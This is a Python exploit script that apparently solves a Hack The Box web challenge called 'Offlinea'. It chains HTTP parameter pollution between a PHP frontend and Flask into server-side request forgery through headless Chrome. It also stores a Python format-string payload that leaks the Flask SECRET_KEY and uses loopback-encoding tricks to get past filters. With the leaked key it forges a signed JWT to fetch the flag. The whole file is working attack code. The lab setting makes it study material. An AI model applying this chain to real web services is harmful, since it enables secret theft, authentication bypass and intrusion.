#!/usr/bin/env python3
"""Offlinea (HTB) - parameter pollution + format-string injection -> SSRF.

The PHP frontend checks $_GET['url'] (last value wins) but forwards the raw
query string to Flask, and Flask's request.args.get('url') takes the first
value. Sending two `url` parameters therefore feeds a private 127.0.0.1 URL to
the scraper while PHP only validates a harmless public one.

Flask treats any IP literal as safe (is_request_safe) and drives headless Chrome
against it. /logs builds its output with str.format(), so a history entry
containing {logify.__globals__[app].config[SECRET_KEY]} leaks the Flask signing
key into the PDF that Chrome renders. With the key we sign a JWT whose
username is not "bartender" (token_required only rejects bartender without
is_admin) and ask Chrome to fetch /bartender, which returns the flag as JSON in
another PDF.

Usage:
    python3 solve.py <target_ip> <target_port>
"""
import base64
import hashlib
import hmac
import io
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# URLs used only to satisfy the PHP-side check. They must be reachable from
# inside the challenge container and return HTTP 200. Never point this at the
# challenge's own public address: php -S has a single worker, so the nested
# curl would deadlock the frontend.
CHECK_URLS = [
    "https://example.com/",
    "http://example.com/",
    "http://[::ffff:7f00:1]:5000/logs",  # IPv4-mapped loopback, bracket bypass
    "http://0x7f000001:5000/logs",       # hex IPv4
    "http://2130706433:5000/logs",       # decimal IPv4
]

INJECTION = "{logify.__globals__[app].config[SECRET_KEY]}"
KEY_RE = re.compile(r"\b[0-9a-f]{64}\b")
FLAG_RE = re.compile(r"HTB\{[^}]*\}")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


OPENER = urllib.request.build_opener(
    urllib.request.ProxyHandler({}), NoRedirect()
)


def call(url, timeout=180):
    """GET without following redirects. Returns (status, headers, body)."""
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with OPENER.open(req, timeout=timeout) as r:
            return r.status, r.headers, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read()


def scrape(base, page_url, check_url):
    """Ask the frontend to scrape page_url. Returns the PDF location or None."""
    query = urllib.parse.urlencode(
        [("url", page_url), ("name", "x"), ("secret", "y"), ("url", check_url)]
    )
    status, headers, _ = call(f"{base}/bartender.php?{query}")
    location = headers.get("Location", "")
    if "/pdfs/results-" in location:
        return location
    return None


def get_pdf(base, location):
    status, _, body = call(base + location)
    if status != 200 or not body.startswith(b"%PDF"):
        raise RuntimeError(f"pdf fetch failed: {status} {body[:120]!r}")
    return body


def pdf_text(data):
    # Chrome subsets its fonts, so the text is glyph-encoded and needs the
    # ToUnicode CMap parsing that pypdf provides.
    try:
        from pypdf import PdfReader
    except ImportError:
        raise SystemExit("pypdf is required: pip install pypdf")

    reader = PdfReader(io.BytesIO(data))
    return "".join((page.extract_text() or "") for page in reader.pages)


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def sign_jwt(payload, key):
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"},
                               separators=(",", ":")).encode())
    body = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header}.{body}".encode()
    sig = hmac.new(key.encode(), signing_input, hashlib.sha256).digest()
    return f"{header}.{body}.{b64url(sig)}"


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <target_ip> <target_port>", file=sys.stderr)
        return 2
    base = f"http://{sys.argv[1]}:{sys.argv[2]}"

    status, _, _ = call(base + "/")
    if status != 200:
        print(f"[-] target is not responding ({status})", file=sys.stderr)
        return 1

    # Step 1: find a check URL that satisfies the PHP filter without
    # deadlocking the single-worker frontend.
    check_url = None
    for candidate in CHECK_URLS:
        location = scrape(base, "http://127.0.0.1:5000/logs?", candidate)
        if location:
            check_url = candidate
            print(f"[+] working check url: {candidate}", file=sys.stderr)
            break
    if not check_url:
        print("[-] no usable check url", file=sys.stderr)
        return 1

    # Step 2: plant the format-string payload in the history table.
    payload_url = "http://127.0.0.1:5000/logs?x=" + INJECTION
    location = scrape(base, payload_url, check_url)
    if not location:
        print("[-] payload scrape failed", file=sys.stderr)
        return 1
    print("[+] payload url stored in history", file=sys.stderr)

    # Step 3: render /logs again; the stored payload leaks SECRET_KEY.
    location = scrape(base, payload_url, check_url)
    if not location:
        print("[-] render scrape failed", file=sys.stderr)
        return 1
    text = pdf_text(get_pdf(base, location))
    match = KEY_RE.search(text)
    if not match:
        print(f"[-] no secret key in pdf:\n{text[:500]}", file=sys.stderr)
        return 1
    key = match.group(0)
    print(f"[+] leaked SECRET_KEY: {key}", file=sys.stderr)

    # Step 4: forge a token. token_required only rejects username "bartender"
    # when is_admin is falsy, so any other username is accepted.
    token = sign_jwt({"username": "guest"}, key)

    # Step 5: let Chrome fetch /bartender and read the flag off the PDF.
    location = scrape(base, f"http://127.0.0.1:5000/bartender?token={token}",
                      check_url)
    if not location:
        print("[-] bartender scrape failed", file=sys.stderr)
        return 1
    text = pdf_text(get_pdf(base, location))
    match = FLAG_RE.search(text)
    if not match:
        print(f"[-] no flag in pdf:\n{text[:800]}", file=sys.stderr)
        return 1
    print(match.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
